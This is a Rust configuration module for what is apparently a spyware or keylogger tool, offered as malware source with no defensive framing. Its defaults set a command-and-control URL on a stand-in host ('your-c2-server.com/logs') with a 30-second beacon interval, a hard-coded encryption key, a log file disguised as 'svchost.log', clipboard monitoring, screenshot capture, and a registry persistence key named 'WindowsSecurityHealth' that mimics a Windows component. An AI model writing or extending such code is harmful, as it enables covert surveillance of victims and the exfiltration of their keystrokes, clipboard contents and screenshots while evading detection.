use serde::{Deserialize, Serialize};
use std::fs;
use std::sync::OnceLock;

#[derive(Debug, Deserialize, Serialize)]
pub struct Config {
    pub c2: C2Config,
    pub encryption: EncryptionConfig,
    pub logging: LoggingConfig,
    pub clipboard: ClipboardConfig,
    pub screenshots: ScreenshotsConfig,
    pub persistence: PersistenceConfig,
}

#[derive(Debug, Deserialize, Serialize)]
pub struct C2Config {
    pub url: String,
    pub interval_seconds: u64,
}

#[derive(Debug, Deserialize, Serialize)]
pub struct EncryptionConfig {
    pub key_hex: String,
}

#[derive(Debug, Deserialize, Serialize)]
pub struct LoggingConfig {
    pub file_name: String,
}

#[derive(Debug, Deserialize, Serialize)]
pub struct ClipboardConfig {
    pub monitor_interval_seconds: u64,
}

#[derive(Debug, Deserialize, Serialize)]
pub struct ScreenshotsConfig {
    pub directory: String,
}

#[derive(Debug, Deserialize, Serialize)]
pub struct PersistenceConfig {
    pub registry_key: String,
}

static CONFIG: OnceLock<Config> = OnceLock::new();

pub fn load_config() -> &'static Config {
    CONFIG.get_or_init(|| {
        let config_path = "config.toml";
        let config_content = fs::read_to_string(config_path)
            .unwrap_or_else(|_| {
                eprintln!("Warning: Could not read config.toml, using default configuration");
                create_default_config()
            });

        toml::from_str(&config_content)
            .unwrap_or_else(|e| {
                eprintln!("Warning: Could not parse config.toml: {}, using default configuration", e);
                let default_str = create_default_config();
                toml::from_str(&default_str).unwrap()
            })
    })
}

fn create_default_config() -> String {
    let default_config = Config {
        c2: C2Config {
            url: "https://your-c2-server.com/logs".to_string(),
            interval_seconds: 30,
        },
        encryption: EncryptionConfig {
            key_hex: "4242424242424242424242424242424242424242424242424242424242424242".to_string(),
        },
        logging: LoggingConfig {
            file_name: "svchost.log".to_string(),
        },
        clipboard: ClipboardConfig {
            monitor_interval_seconds: 5,
        },
        screenshots: ScreenshotsConfig {
            directory: "screenshots".to_string(),
        },
        persistence: PersistenceConfig {
            registry_key: "WindowsSecurityHealth".to_string(),
        },
    };

    toml::to_string(&default_config).unwrap()
}

// Convenience functions to access config values
pub fn c2_url() -> &'static str {
    &load_config().c2.url
}

pub fn encryption_key() -> [u8; 32] {
    let key_hex = &load_config().encryption.key_hex;
    let bytes = hex::decode(key_hex).unwrap_or_else(|_| vec![0x42; 32]);
    let mut key = [0u8; 32];
    key.copy_from_slice(&bytes[..32]);
    key
}

pub fn log_file() -> &'static str {
    &load_config().logging.file_name
}

pub fn c2_interval() -> u64 {
    load_config().c2.interval_seconds
}

pub fn clipboard_interval() -> u64 {
    load_config().clipboard.monitor_interval_seconds
}

pub fn screenshot_dir() -> &'static str {
    &load_config().screenshots.directory
}

pub fn registry_key() -> &'static str {
    &load_config().persistence.registry_key
}